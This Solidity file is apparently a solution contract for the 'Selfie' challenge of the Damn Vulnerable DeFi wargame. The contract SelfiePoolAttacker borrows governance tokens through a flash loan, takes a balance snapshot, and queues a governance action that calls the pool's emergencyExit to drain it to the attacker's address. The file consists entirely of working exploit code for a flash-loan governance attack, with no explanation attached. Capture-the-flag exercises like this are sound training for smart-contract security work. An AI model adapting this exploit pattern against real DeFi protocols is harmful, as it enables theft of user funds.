// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./ISimpleGovernance.sol";
import "./SelfiePool.sol";

contract SelfiePoolAttacker is IERC3156FlashBorrower {
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    ISimpleGovernance private _governance;
    SelfiePool private _pool;
    address public player;

    uint256 public actionId;

    constructor(ISimpleGovernance governance, SelfiePool pool) {
        _governance = governance;
        _pool = pool;
        player = msg.sender;
    }

    function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        DamnValuableTokenSnapshot(token).snapshot();
        actionId = _governance.queueAction(address(_pool), 0, abi.encodeWithSelector(SelfiePool.emergencyExit.selector, player));

        DamnValuableTokenSnapshot(token).approve(address(_pool), amount);

        return CALLBACK_SUCCESS;
    }
}
